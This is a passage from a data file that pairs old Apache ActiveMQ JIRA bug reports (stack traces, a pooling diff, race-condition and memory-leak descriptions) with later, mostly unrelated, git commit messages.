	at org.mule.providers.SingleAttemptConnectionStrategy.doConnect(SingleAttemptConnectionStrategy.java:32)
	at org.mule.providers.AbstractConnectionStrategy.connect(AbstractConnectionStrategy.java:67)
	at org.mule.providers.AbstractConnector.connect(AbstractConnector.java:751)
	at org.mule.providers.SingleAttemptConnectionStrategy.doConnect(SingleAttemptConnectionStrategy.java:32)
	at org.mule.providers.AbstractConnectionStrategy.connect(AbstractConnectionStrategy.java:67)
	at org.mule.providers.AbstractConnector.startConnector(AbstractConnector.java:222)
	at org.mule.MuleManager.startConnectors(MuleManager.java:723)
	at org.mule.MuleManager.start(MuleManager.java:684)

In the above example, ActiveMQ is being initialized by Mule.",83eb01188a9a563a43bb919871b9ce46482531a2,"AMQ-4008: Fixed MDC leak during shutting down AMQ broker, such as reported by Apache Tomcat.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1379923 13f79535-47bb-0310-9956-ffa450edef68"
12482167,AMQ-400,"When I turn on DEBUG view in logging, I notice the following exception:

DEBUG org.activemq.spring.ActiveMQDtdResolver: Trying to locate [http://activemq.org/dtd/3.2/activemq.dtd]
java.io.FileNotFoundException: http://activemq.org/dtd/3.2/activemq.dtd
	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)
	at java.net.URL.openStream(Unknown Source)
	at org.activemq.spring.ActiveMQDtdResolver.resolveRemotely(ActiveMQDtdResolver.java:82)
	at org.activemq.spring.ActiveMQDtdResolver.resolveEntity(ActiveMQDtdResolver.java:59)
	at org.apache.xerces.util.EntityResolverWrapper.resolveEntity(Unknown Source)
	at org.apache.xerces.impl.XMLEntityManager.resolveEntity(Unknown Source)
	at org.apache.xerces.impl.XMLDocumentScannerImpl$DTDDispatcher.dispatch(Unknown Source)
	at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument(Unknown Source)
	at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source)
	at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source)
	at org.apache.xerces.parsers.XMLParser.parse(Unknown Source)
	at org.apache.xerces.parsers.DOMParser.parse(Unknown Source)
	at org.apache.xerces.jaxp.DocumentBuilderImpl.parse(Unknown Source)
	at javax.xml.parsers.DocumentBuilder.parse(Unknown Source)
	at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:145)
	at org.activemq.spring.ActiveMQBeanFactory.<init>(ActiveMQBeanFactory.java:86)
	at org.activemq.spring.ActiveMQBeanFactory.<init>(ActiveMQBeanFactory.java:57)
	at org.activemq.spring.SpringBrokerContainerFactory.createBrokerContainer(SpringBrokerContainerFactory.java:86)
	at org.activemq.broker.BrokerContext.getBrokerContainerByName(BrokerContext.java:50)
	at org.activemq.ActiveMQConnectionFactory.getContainer(ActiveMQConnectionFactory.java:838)
	at org.activemq.ActiveMQConnectionFactory.createBrokerConnector(ActiveMQConnectionFactory.java:845)
	at org.activemq.ActiveMQConnectionFactory.createTransportChannel(ActiveMQConnectionFactory.java:815)
	at org.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:608)
	at org.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:598)
	at org.mule.providers.jms.Jms11Support.createConnection(Jms11Support.java:68)
	at org.mule.providers.jms.JmsConnector.createConnection(JmsConnector.java:203)
	at org.mule.providers.jms.JmsConnector.doConnect(JmsConnector.java:216)
	at org.mule.providers.AbstractConnector.connect(AbstractConnector.java:757)
	at org.mule.providers.SingleAttemptConnectionStrategy.doConnect(SingleAttemptConnectionStrategy.java:32)
	at org.mule.providers.AbstractConnectionStrategy.connect(AbstractConnectionStrategy.java:67)
	at org.mule.providers.AbstractConnector.connect(AbstractConnector.java:751)
	at org.mule.providers.SingleAttemptConnectionStrategy.doConnect(SingleAttemptConnectionStrategy.java:32)
	at org.mule.providers.AbstractConnectionStrategy.connect(AbstractConnectionStrategy.java:67)
	at org.mule.providers.AbstractConnector.startConnector(AbstractConnector.java:222)
	at org.mule.MuleManager.startConnectors(MuleManager.java:723)
	at org.mule.MuleManager.start(MuleManager.java:684)

In the above example, ActiveMQ is being initialized by Mule.",0061f6f75538ede8fe3443925e64beb839abfb90,"https://issues.apache.org/jira/browse/AMQ-4000 - tracking subscription commands causes a problem with replay outside of activate - can reset a sub ack locations - regression in AMQ2149Test. Fixed by ignoring sub add during recovery replay

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1511306 13f79535-47bb-0310-9956-ffa450edef68"
12481423,AMQ-399,"
javax.jms.JMSException: Failed to build body from bytes. Reason: java.io.EOFException: Unexpected end of ZLIB input stream
        at org.activemq.message.ActiveMQObjectMessage.createFailedToBuildBodyException(ActiveMQObjectMessage.java:232)
        at org.activemq.message.ActiveMQObjectMessage.getObject(ActiveMQObjectMessage.java:164)
        at com.hb.jms.api.util.JmsSessionWrapper.handleMessage(JmsSessionWrapper.java:342)
        at com.hb.jms.api.util.JmsSessionWrapper.driveWrapperInner(JmsSessionWrapper.java:511)
        at com.hb.jms.api.util.JmsSessionWrapper$InnerRunner.run(JmsSessionWrapper.java:619)
        at java.lang.Thread.run(Thread.java:595)",640424727d0db68047dd16701e3e03bc4ef2b680,"https://issues.apache.org/jira/browse/AMQ-3998 https://issues.apache.org/jira/browse/AMQ-3999 - retroactive durables not supported by older stores, kaha and amq

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1380847 13f79535-47bb-0310-9956-ffa450edef68"
12481392,AMQ-398,Lack of synchronization in the org.activemq.io.util.FileDataBlock.activate and deactivate method. This causes an invalid handle IOException when a fast producer sends a large number of non-persistent messages to a slow consumer.,c6f9db8bfcc8c9f992817943f992203d3da86bf6,"https://issues.apache.org/jira/browse/AMQ-3980 - websockets increase max size of text message

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1374226 13f79535-47bb-0310-9956-ffa450edef68"
12481392,AMQ-398,Lack of synchronization in the org.activemq.io.util.FileDataBlock.activate and deactivate method. This causes an invalid handle IOException when a fast producer sends a large number of non-persistent messages to a slow consumer.,ba9037ca65abd4d7657971555c65d4fada710c7c,"https://issues.apache.org/jira/browse/AMQ-3985 - ActiveMQConnection temp advisory consumer should use asyncDispatch - can cause deadlock with slow consumers. Fix with test

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1375595 13f79535-47bb-0310-9956-ffa450edef68"
12481392,AMQ-398,Lack of synchronization in the org.activemq.io.util.FileDataBlock.activate and deactivate method. This causes an invalid handle IOException when a fast producer sends a large number of non-persistent messages to a slow consumer.,86e9527e1fc7c9a17493073c418a924a740951be,"https://issues.apache.org/jira/browse/AMQ-3986 - optimizeDurablePrefetch with RA adapter

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1376431 13f79535-47bb-0310-9956-ffa450edef68"
12481392,AMQ-398,Lack of synchronization in the org.activemq.io.util.FileDataBlock.activate and deactivate method. This causes an invalid handle IOException when a fast producer sends a large number of non-persistent messages to a slow consumer.,00bdf0044a275c1d766ded913e1ca67a30667d7d,"https://issues.apache.org/jira/browse/AMQ-3986 - optimizeDurablePrefetch on ActiveMQConnectionSupport

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1378057 13f79535-47bb-0310-9956-ffa450edef68"
12481276,AMQ-396,<NA>,3c39db8cce4a696e58417e7b5fc9892fd2667e8f,"fix and test for: https://issues.apache.org/jira/browse/AMQ-3961

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1374229 13f79535-47bb-0310-9956-ffa450edef68"
12481474,AMQ-393,"When a PooledConnectionFactory is stopped, ObjectPools created by the SessionPools aren't closed, and therefore PooledSessions remain running.  Since the underlying ActiveMQSession isn't actually closed when the PooledSession is closed, the ActiveMQSessionExecutor and its worker threads are never stopped.  I added a method to PooledConnection called ""destroyPools"" which will close the ObjectPools associated with a connection.  The differences are pasted below.

diff oldpool/PooledConnection.java pool/PooledConnection.java
21a22
> import java.util.Iterator;
154a156,163
>     protected void destroyPools() {
>         Iterator i = cache.values().iterator();
>         while (i.hasNext()) {
>             SessionPool pool = (SessionPool) i.next();
>             i.remove();
>             pool.close();
>         }
>     }
diff oldpool/PooledConnectionFactory.java pool/PooledConnectionFactory.java
95a96
>             connection.destroyPools();
diff oldpool/SessionPool.java pool/SessionPool.java
98c98,104
<
---
>     protected void close() {
>         if (sessionPool != null) {
>             try {
>                 sessionPool.close();
>             } catch (Exception e) {}
>         }
>     }",0227c081120108b912bcb8898b83c2c4b5bb0119,"fix and tests for: https://issues.apache.org/jira/browse/AMQ-3932

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1364009 13f79535-47bb-0310-9956-ffa450edef68"
12481452,AMQ-390,"If the same message is added to, and then removed from, the JDBCMessageStore, by two different threads, it is possible that both threads will attempt to delete the same row, leaving the second one behind.

This is because the same sequence number is retrieved from the JDBCMessageStore::getMessageSequenceId() method.

i.e. suppose we have MessageA stored in the MessageStore with sequence numbers 205 and 210 and the following occurs:

Thread One  - removeMessage(MessageA)
Thread Two - removeMessage(MessageA)
Thread One - getMessageSequenceId(MessageA) --> returns top row i.e. sequence number 205
Thread Two - getMessageSequenceId(MessageA) --> returns top row i.e. sequence number 205
Thread One - Deletes row with sequence number 205
Thread Two - Attempts to delete row with sequence number 205

This situation can eventuate in a clustered environment when the message is bounced between two nodes before being sent to an actual consumer, and the message acknowledgement is sufficiently delayed.

i.e.  Suppose we have:

Node0 <---> Node1

|

Consumer

And the following happens:

(i) Message is sent from Node 0 to Node 1
(ii) Message is sent back from Node 1 to Node 0
(iii) Message is sent from Node 0 to consumer, C
(iv) Ack arrives from consumer C and from Node 1.

The best possible fix  would be to ensure that acknowledgements always contain the sequence number of the message that they're acknowledging, thus ensuring the JDBCMessageStore doesn't have to try and determine the sequence number of the message to remove.

Another possible fix, is for the JDBCMessageStore to remove the topmost remaining row in the store for the row with the matching message id, by pushing the sequence id lookup into a nested delete query. That would prevent the two Threads from attempting to delete the same row. This isn't the best solution but works in a situation where the sequence number is never provided with an acknowledgement.
",a5bb9bd1d792b1676884f31e5254d9e1c4fbb27c,"https://issues.apache.org/jira/browse/AMQ-3903  - expand test to validate Full advisory: https://issues.apache.org/jira/browse/AMQ-3925

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1361138 13f79535-47bb-0310-9956-ffa450edef68"
12481255,AMQ-380,<NA>,681c1abf370aff00a2beda5b095f50cba2f8ece8,"add a test for: https://issues.apache.org/jira/browse/AMQ-3802

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1311239 13f79535-47bb-0310-9956-ffa450edef68"
12481377,AMQ-379,"I found if the Recevier and Sender start almost the same time.  The Receiver will receiver the same message twise.  I have included my Testing program run by 
java -classpath .;..\activemq-3.1.jar;..\lib\geronimo-spec-jms-1.1-rc4.jar;..\lib\geronimo-spec-j2ee-management-1.0-rc4.jar;..\lib\commons-logging-1.0.3.jar;..\lib\log4j-1.2.8.jar;..\lib\concurrent-1.3.4.jar;..\conf;..\lib\spring-1.2.2.jar TestJmsSender

I have test by restarted the program ~10 times and around 40% chance of have the error of receiver rec same message twise

",bed42a27c606cf9133eb874bb934ce7dfa5004d6,"AMQ-3797: Added unit test for StringArrayEditor

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1380147 13f79535-47bb-0310-9956-ffa450edef68"
12481394,AMQ-377,"Scenarion:

1. 10 consumer is created (each has its own connection) then closes the connection right away. The application is executed several times.

Expected behaviour: A ""postgres process"" is created when a consumer creates a connection. Subsequently, when the consumer closes/stops the connection, the ""postgres process"" should also closes/stops.
Actual behaviour: Inconsistent, most of the time, postgres process remains active even though the consumer is already disconnected. So, creating new consumer eventually leads to exception where it disallows further connection to postgres. The solution here is to restart the broker to kill all ""postgres processes"" the was created by disconnected consumers.

""Failed to create transaction: org.postgresql.util.PSQLException: Backend start-up failed: FATAL: sorry, too many clients already."" (see attached log file).
",5ea1c1c042156b982a7611b911d7dcb0322e8a8b,"updated for https://issues.apache.org/jira/browse/AMQ-3772

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1302490 13f79535-47bb-0310-9956-ffa450edef68"
12481394,AMQ-377,"Scenarion:

1. 10 consumer is created (each has its own connection) then closes the connection right away. The application is executed several times.

Expected behaviour: A ""postgres process"" is created when a consumer creates a connection. Subsequently, when the consumer closes/stops the connection, the ""postgres process"" should also closes/stops.
Actual behaviour: Inconsistent, most of the time, postgres process remains active even though the consumer is already disconnected. So, creating new consumer eventually leads to exception where it disallows further connection to postgres. The solution here is to restart the broker to kill all ""postgres processes"" the was created by disconnected consumers.

""Failed to create transaction: org.postgresql.util.PSQLException: Backend start-up failed: FATAL: sorry, too many clients already."" (see attached log file).
",08b95689cb504b6fe6da0be4d61b176b046ad630,"updated for https://issues.apache.org/jira/browse/AMQ-3772

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1302494 13f79535-47bb-0310-9956-ffa450edef68"
12481394,AMQ-377,"Scenarion:

1. 10 consumer is created (each has its own connection) then closes the connection right away. The application is executed several times.

Expected behaviour: A ""postgres process"" is created when a consumer creates a connection. Subsequently, when the consumer closes/stops the connection, the ""postgres process"" should also closes/stops.
Actual behaviour: Inconsistent, most of the time, postgres process remains active even though the consumer is already disconnected. So, creating new consumer eventually leads to exception where it disallows further connection to postgres. The solution here is to restart the broker to kill all ""postgres processes"" the was created by disconnected consumers.

""Failed to create transaction: org.postgresql.util.PSQLException: Backend start-up failed: FATAL: sorry, too many clients already."" (see attached log file).
",13e5777efb8f13c916a14fd415425a350713c244,"additional test for: https://issues.apache.org/jira/browse/AMQ-3775

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1302641 13f79535-47bb-0310-9956-ffa450edef68"
12481394,AMQ-377,"Scenarion:

1. 10 consumer is created (each has its own connection) then closes the connection right away. The application is executed several times.

Expected behaviour: A ""postgres process"" is created when a consumer creates a connection. Subsequently, when the consumer closes/stops the connection, the ""postgres process"" should also closes/stops.
Actual behaviour: Inconsistent, most of the time, postgres process remains active even though the consumer is already disconnected. So, creating new consumer eventually leads to exception where it disallows further connection to postgres. The solution here is to restart the broker to kill all ""postgres processes"" the was created by disconnected consumers.

""Failed to create transaction: org.postgresql.util.PSQLException: Backend start-up failed: FATAL: sorry, too many clients already."" (see attached log file).
",bd5124cf94ec50885a99ef4265a7396ab3e73f33,"Added config test for LevelDB - for https://issues.apache.org/jira/browse/AMQ-3772

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1302904 13f79535-47bb-0310-9956-ffa450edef68"
12481394,AMQ-377,"Scenarion:

1. 10 consumer is created (each has its own connection) then closes the connection right away. The application is executed several times.

Expected behaviour: A ""postgres process"" is created when a consumer creates a connection. Subsequently, when the consumer closes/stops the connection, the ""postgres process"" should also closes/stops.
Actual behaviour: Inconsistent, most of the time, postgres process remains active even though the consumer is already disconnected. So, creating new consumer eventually leads to exception where it disallows further connection to postgres. The solution here is to restart the broker to kill all ""postgres processes"" the was created by disconnected consumers.

""Failed to create transaction: org.postgresql.util.PSQLException: Backend start-up failed: FATAL: sorry, too many clients already."" (see attached log file).
",1d7b69d55c644dabfb605e3cd84bcaeab1b93902,"Added package.html for levelDB stub - for https://issues.apache.org/jira/browse/AMQ-3772

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1302912 13f79535-47bb-0310-9956-ffa450edef68"
12481394,AMQ-377,"Scenarion:

1. 10 consumer is created (each has its own connection) then closes the connection right away. The application is executed several times.

Expected behaviour: A ""postgres process"" is created when a consumer creates a connection. Subsequently, when the consumer closes/stops the connection, the ""postgres process"" should also closes/stops.
Actual behaviour: Inconsistent, most of the time, postgres process remains active even though the consumer is already disconnected. So, creating new consumer eventually leads to exception where it disallows further connection to postgres. The solution here is to restart the broker to kill all ""postgres processes"" the was created by disconnected consumers.

""Failed to create transaction: org.postgresql.util.PSQLException: Backend start-up failed: FATAL: sorry, too many clients already."" (see attached log file).
",3cea40d889fa87aa053fa2472f90c3d30b586352,"https://issues.apache.org/jira/browse/AMQ-3775

Ensure that the orderIndex is reset to a good state. 

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1303128 13f79535-47bb-0310-9956-ffa450edef68"
12481394,AMQ-377,"Scenarion:

1. 10 consumer is created (each has its own connection) then closes the connection right away. The application is executed several times.

Expected behaviour: A ""postgres process"" is created when a consumer creates a connection. Subsequently, when the consumer closes/stops the connection, the ""postgres process"" should also closes/stops.
Actual behaviour: Inconsistent, most of the time, postgres process remains active even though the consumer is already disconnected. So, creating new consumer eventually leads to exception where it disallows further connection to postgres. The solution here is to restart the broker to kill all ""postgres processes"" the was created by disconnected consumers.

""Failed to create transaction: org.postgresql.util.PSQLException: Backend start-up failed: FATAL: sorry, too many clients already."" (see attached log file).
",ccaf0839daf14ccf13b225240fc85345d68b41ec,"additional test for: https://issues.apache.org/jira/browse/AMQ-3775

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1311511 13f79535-47bb-0310-9956-ffa450edef68"
12481394,AMQ-377,"Scenarion:

1. 10 consumer is created (each has its own connection) then closes the connection right away. The application is executed several times.

Expected behaviour: A ""postgres process"" is created when a consumer creates a connection. Subsequently, when the consumer closes/stops the connection, the ""postgres process"" should also closes/stops.
Actual behaviour: Inconsistent, most of the time, postgres process remains active even though the consumer is already disconnected. So, creating new consumer eventually leads to exception where it disallows further connection to postgres. The solution here is to restart the broker to kill all ""postgres processes"" the was created by disconnected consumers.

""Failed to create transaction: org.postgresql.util.PSQLException: Backend start-up failed: FATAL: sorry, too many clients already."" (see attached log file).
",fc4eb63ad8d6b6a2741ad973cd67ced1017c51c9,"applied leveldb-2.patch for https://issues.apache.org/jira/browse/AMQ-3772

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1326494 13f79535-47bb-0310-9956-ffa450edef68"
12481394,AMQ-377,"Scenarion:

1. 10 consumer is created (each has its own connection) then closes the connection right away. The application is executed several times.

Expected behaviour: A ""postgres process"" is created when a consumer creates a connection. Subsequently, when the consumer closes/stops the connection, the ""postgres process"" should also closes/stops.
Actual behaviour: Inconsistent, most of the time, postgres process remains active even though the consumer is already disconnected. So, creating new consumer eventually leads to exception where it disallows further connection to postgres. The solution here is to restart the broker to kill all ""postgres processes"" the was created by disconnected consumers.

""Failed to create transaction: org.postgresql.util.PSQLException: Backend start-up failed: FATAL: sorry, too many clients already."" (see attached log file).
",740f5b36dabe549cab66cba413106afd76d83343,"Additional test for: https://issues.apache.org/jira/browse/AMQ-3775


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1329225 13f79535-47bb-0310-9956-ffa450edef68"
12481483,AMQ-366,"This code crashes broker sooner or later regardless of the memory given to the broker. Broker run with 1Mb of heap crashes after ~2850 attempts (processed in several seconds only).

        ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(""tcp://192.168.0.2:62002"");
        QueueConnection connection = connectionFactory.createQueueConnection();
        connection.start();
        QueueSession session = connection.createQueueSession(true, Session.AUTO_ACKNOWLEDGE);
        int n = 1;
        while (true) {
            System.out.println(""attempt "" + n++);
            TemporaryQueue temporaryQueue = session.createTemporaryQueue();
            temporaryQueue.delete();
        }

",4ddd9019c8e59ff0940b04baa24a47e0725ba137,"AMQ-3665: Turned on Velocity template caching to reduce memory footprint of AMQ store journal reader. 

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1234779 13f79535-47bb-0310-9956-ffa450edef68"
12481483,AMQ-366,"This code crashes broker sooner or later regardless of the memory given to the broker. Broker run with 1Mb of heap crashes after ~2850 attempts (processed in several seconds only).

        ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(""tcp://192.168.0.2:62002"");
        QueueConnection connection = connectionFactory.createQueueConnection();
        connection.start();
        QueueSession session = connection.createQueueSession(true, Session.AUTO_ACKNOWLEDGE);
        int n = 1;
        while (true) {
            System.out.println(""attempt "" + n++);
            TemporaryQueue temporaryQueue = session.createTemporaryQueue();
            temporaryQueue.delete();
        }

",00bee4ee1341f19aa69748155a8bb9b722c26065,"AMQ-3665: Added JUnit test

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1234782 13f79535-47bb-0310-9956-ffa450edef68"
12481483,AMQ-366,"This code crashes broker sooner or later regardless of the memory given to the broker. Broker run with 1Mb of heap crashes after ~2850 attempts (processed in several seconds only).

        ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(""tcp://192.168.0.2:62002"");
        QueueConnection connection = connectionFactory.createQueueConnection();
        connection.start();
        QueueSession session = connection.createQueueSession(true, Session.AUTO_ACKNOWLEDGE);
        int n = 1;
        while (true) {
            System.out.println(""attempt "" + n++);
            TemporaryQueue temporaryQueue = session.createTemporaryQueue();
            temporaryQueue.delete();
        }

",d44513a6559f5163a81e7611ad79ee125e1546ce,"fix for: https://issues.apache.org/jira/browse/AMQ-3669

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1342028 13f79535-47bb-0310-9956-ffa450edef68"
12481362,AMQ-357,"I have developped a little application. It's goal is to send and recieve message on a queue.
I use an EJBStateful deploy on WebSphere.
I have configure an QueueConnectionFactory on WAS Ressource Adapter.

I have two services on the EJB :
                       open (Queue) where 
                                            I retrieve QueueConnectionFactory with JNDI Look up :

InitialContext ictx = new InitialContext();
qFactory =(QueueConnectionFactory) ictx.lookup(CONNECTION_JNDI_QUEUE);


                                            I create Connection, Session, Destination and producer:

	try {
				staticQueueConnection = qFactory.createConnection();
				staticQueueConnection.start();
				staticQueueSession = staticQueueConnection.createSession(transacted, ackMode);
				if (staticQueueSession!=null)
				{
					staticQueueDestination = staticQueueSession.createQueue(queueName);
					log.info(""Created destination: "" + staticQueueDestination);
				
					staticQueueProducer = staticQueueSession.createProducer(staticQueueDestination);
					log.info(""Created producer: "" + staticQueueProducer);
					
					
				}
			} catch (JMSException e1) {
				
				throw new NotificationException(e1.toString());
			}

                        publish(MEssage)  where 
                                            I just send message on queue:

messages = staticQueueSession.createTextMessage(notification.getText());
staticQueueProducer.send(messages);




I stock the producer on the session.

So my application do :
              Call open() so we can see on ActiveMQ log that a connection is created with a client but just after this exécution the client is removed!!!
             So when applicatiion call publish() I have the message ""Connection is closed"" adn publish failed.

I meet this problem only if I retrieve the QueueConnectionFactory on WebSphere if I create directly on classe the QueueConnectionFactory I don't met any probleme, every thing work:

	aFactory = new ActiveMQConnectionFactory();
	aFactory.setBrokerURL(URL_BROKER);
  
So If you have an idea it will be great...
",d403f107224244abbe53e8e9cb90959ae402885a,"Additional Fix for https://issues.apache.org/jira/browse/AMQ-3573 - Add check for improperly configured temp store limits 

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1239319 13f79535-47bb-0310-9956-ffa450edef68"
12482074,AMQ-349,"If you have a supplier publishing to a topic, with two consumers both consuming that topic, a problem with one of the consumers can eventually stop message flow to the other consumer.  The consumer-problem is specifically categorized as some sort of freeze-up, such that the broker eventually blocks on the socket write to that consumer.  The freeze-up could be the process itself (perhaps a problem with the JVM), the network, or perhaps the machine that the consumer is running on panics and goes away.

Once the socket becomes blocked, the broker will queue (upto maxOutstandingMessages) to the consumer.  The properly behaving consumer continues to receive events at this point.  However, once the queue size reaches maxOutstandingMessages, the broker (the session dispatcher thread for the given topic) will block on the PooledExecutor.execute method.  This now prohibits any further message delivery for the given topic to the properly behaving consumer.

I'm wondering why the ""waitWhenBlocked"" policy on the PooledExecutor is used?  These are NON_PERSISTENT messages, so what would be the problem with potentially using one of the discard policies, such as ""discardOldestWhenBlocked"" (or ""discardWhenBlocked"")?  Seems like one of these two policies should be used by default, and the ""waitWhenBlocked"" would be a configurable option.  Our preference would be to use ""discardOldestWhenBlocked"".  I changed TcpTransportServerChannel.java to use ""discardOldestWhenBlocked"", which gave us our desired functionality.

From our point of view, having the broker affect all consumers on behalf of one misbehaving one is bad.  So, what might we be missing with regards to using ""discardOldestWhenBlocked""?",5cf4ada14afeaad7d560f2c652aaa59e697f0c8d,"AMQ-3498: Added support for using ActiveMQ Destination Options in the Camel endpoint uris, by specifing the options with destination. prefix.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1170599 13f79535-47bb-0310-9956-ffa450edef68"
12482074,AMQ-349,"If you have a supplier publishing to a topic, with two consumers both consuming that topic, a problem with one of the consumers can eventually stop message flow to the other consumer.  The consumer-problem is specifically categorized as some sort of freeze-up, such that the broker eventually blocks on the socket write to that consumer.  The freeze-up could be the process itself (perhaps a problem with the JVM), the network, or perhaps the machine that the consumer is running on panics and goes away.

Once the socket becomes blocked, the broker will queue (upto maxOutstandingMessages) to the consumer.  The properly behaving consumer continues to receive events at this point.  However, once the queue size reaches maxOutstandingMessages, the broker (the session dispatcher thread for the given topic) will block on the PooledExecutor.execute method.  This now prohibits any further message delivery for the given topic to the properly behaving consumer.

I'm wondering why the ""waitWhenBlocked"" policy on the PooledExecutor is used?  These are NON_PERSISTENT messages, so what would be the problem with potentially using one of the discard policies, such as ""discardOldestWhenBlocked"" (or ""discardWhenBlocked"")?  Seems like one of these two policies should be used by default, and the ""waitWhenBlocked"" would be a configurable option.  Our preference would be to use ""discardOldestWhenBlocked"".  I changed TcpTransportServerChannel.java to use ""discardOldestWhenBlocked"", which gave us our desired functionality.

From our point of view, having the broker affect all consumers on behalf of one misbehaving one is bad.  So, what might we be missing with regards to using ""discardOldestWhenBlocked""?",7d082c36bbcbc3428e630523a54f169fe1fa017d,"https://issues.apache.org/jira/browse/AMQ-3490 - allow optional lazyInit of temp (plist) store

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1172528 13f79535-47bb-0310-9956-ffa450edef68"
12481534,AMQ-344,"ManagedConnectionFactoryTest fails. The test was run on a Dell Inspiron 8600 with Windows XP:

Testcase: testConnectionFactoryConnectionMatching(org.activemq.ra.ManagedConnectionFactoryTest): Caused an ERROR
Journal is closed.
javax.jms.JMSException: Journal is closed.
at org.activemq.util.JMSExceptionHelper.newJMSException(JMSExceptionHelper.java:49)
at org.activemq.util.ExceptionTemplate.throwJMSException(ExceptionTemplate.java:72)
at org.activemq.broker.impl.DefaultBroker.stop(DefaultBroker.java:210)
at org.activemq.broker.impl.BrokerContainerImpl.stop(BrokerContainerImpl.java:266)
at org.activemq.ra.ManagedConnectionFactoryTest.tearDown(ManagedConnectionFactoryTest.java:92)
Caused by: java.lang.IllegalStateException: Journal is closed.
at org.activemq.store.journal.JournalPersistenceAdapter.checkpoint(JournalPersistenceAdapter.java:314)
at org.activemq.store.journal.JournalPersistenceAdapter.stop(JournalPersistenceAdapter.java:214)
at org.activemq.store.cache.CachePersistenceAdapter.stop(CachePersistenceAdapter.java:85)
at org.activemq.broker.impl.DefaultBroker$3.execute(DefaultBroker.java:206)
at org.activemq.util.ExceptionTemplate.run(ExceptionTemplate.java:41)
at org.activemq.broker.impl.DefaultBroker.stop(DefaultBroker.java:204)
... 11 more ",d314b7f57d066913a95bfdece63997880d75d236,"https://issues.apache.org/jira/browse/AMQ-3449

Add the setters/getters back for the ignore wireformat options.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1174097 13f79535-47bb-0310-9956-ffa450edef68"
12481534,AMQ-344,"ManagedConnectionFactoryTest fails. The test was run on a Dell Inspiron 8600 with Windows XP:

Testcase: testConnectionFactoryConnectionMatching(org.activemq.ra.ManagedConnectionFactoryTest): Caused an ERROR
Journal is closed.
javax.jms.JMSException: Journal is closed.
at org.activemq.util.JMSExceptionHelper.newJMSException(JMSExceptionHelper.java:49)
at org.activemq.util.ExceptionTemplate.throwJMSException(ExceptionTemplate.java:72)
at org.activemq.broker.impl.DefaultBroker.stop(DefaultBroker.java:210)
at org.activemq.broker.impl.BrokerContainerImpl.stop(BrokerContainerImpl.java:266)
at org.activemq.ra.ManagedConnectionFactoryTest.tearDown(ManagedConnectionFactoryTest.java:92)
Caused by: java.lang.IllegalStateException: Journal is closed.
at org.activemq.store.journal.JournalPersistenceAdapter.checkpoint(JournalPersistenceAdapter.java:314)
at org.activemq.store.journal.JournalPersistenceAdapter.stop(JournalPersistenceAdapter.java:214)
at org.activemq.store.cache.CachePersistenceAdapter.stop(CachePersistenceAdapter.java:85)
at org.activemq.broker.impl.DefaultBroker$3.execute(DefaultBroker.java:206)
at org.activemq.util.ExceptionTemplate.run(ExceptionTemplate.java:41)
at org.activemq.broker.impl.DefaultBroker.stop(DefaultBroker.java:204)
... 11 more ",c062020bcbe03d09efe3721fbae2723d697734f5,"add a test to show that https://issues.apache.org/jira/browse/AMQ-3445 is not an issue in trunk.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1241935 13f79535-47bb-0310-9956-ffa450edef68"
12481192,AMQ-343,"reported by Aleksi Kallio

> java.lang.NullPointerException
>         at 
> org.activemq.broker.impl.AdvisorySupport.matchGeneralAdvisory(AdvisorySupport.java:294) 
",fa2b058dd52fb447b893512dfbb5eb370c456926,"https://issues.apache.org/jira/browse/AMQ-3375: stomp consumer might not receive all msgs of a virtual topic queue with memory limits. Committing tims test case which works fine post resolution of https://issues.apache.org/jira/browse/AMQ-3434

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1153463 13f79535-47bb-0310-9956-ffa450edef68"
12481504,AMQ-337,"This is re-submission of bug AMQ-334, since the link to AMQ-334 is broken on Jira.
 
A message consumer will not receive message that matches its message selector definition, until all other messages with higher priority have been consumerd from the queue.

For example, say our messages have a property which can have one of two values - 'S' and 'N'. We have a queue where, at the moment, there is only one consumer, who is set up to consume only 'S' messages.  We've tested
this with two scenarios:
1)       Place an 'N' message in the queue, followed by an 'S'.  No
priority is assigned to the messages.  The consumer is able to receive
the 'S' message, even though the 'N' message is ahead of it in the
queue.  This is the behavior that we find logical.

2)       Place an 'N' message in the queue with a priority of 4,
